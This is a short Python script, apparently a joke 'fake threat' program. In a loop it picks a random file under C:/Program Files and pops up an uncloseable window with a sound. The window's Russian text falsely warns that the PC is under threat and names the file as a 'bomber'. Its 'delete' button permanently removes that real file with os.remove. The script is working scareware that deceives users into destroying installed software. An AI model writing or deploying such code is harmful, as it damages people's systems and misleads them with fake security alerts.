from tkinter import *
import random
import os
import time
import pygame

pygame.init()
sound = pygame.mixer.Sound("obrezaniye.wav")

def main():
    

    def do_nothing():
        pass
        
    def delete():
        os.remove(random_path)
        window.destroy()
        return

    def skip():
        window.destroy()
        return

    while True:
    
        def find_random_path(directory):
            file_list = []
            for root, dirs, files in os.walk(directory):
                for file in files:
                    file_list.append(os.path.join(root, file))

            if file_list:
                return random.choice(file_list)
            else:
                return None
        
        random_path = find_random_path("C:/Program Files")
        random_file = os.path.basename(random_path)
        
        rand_time = random.randint(5, 56)
        print(rand_time)
        time.sleep(rand_time)
        sound.play()

        window = Tk()
        window.protocol("WM_DELETE_WINDOW", do_nothing)
        window.title("Внимание! Обнаружена угроза!")
        window.geometry("512x512")
        window.resizable(0, 0)

        window.configure(bg="#222222")

        Label(text="Внимание!", font=("Comic Sans MS", 72), fg="red", bg="#222222").pack()
        Label(text="Ваш ПК находится под угрозой!", font=("Comic Sans MS", 24), bg="#222222", fg="white").pack()
        Label(text="Если вы ничего не сделаете,\n ваш компьютер станет опасным!\n", font=("Comic Sans MS", 24, "bold"), bg="#222222", fg="white").pack()
        Label(text="название бомбера", font=("Comic Sans MS", 24, "italic"), bg="#222222", fg="white").pack()
        Label(text=random_file, font=("Comic Sans MS", 24, "italic"), bg="#222222", fg="white").pack()
        Button(text="удолить", font=("Comic Sans MS", 24), fg="yellow", bg="blue", command=delete).pack(side=LEFT)
        Button(text="взорваца", font=("Comic Sans MS", 24), fg="yellow", bg="blue", command=skip).pack(side=RIGHT)
        window.mainloop()

main()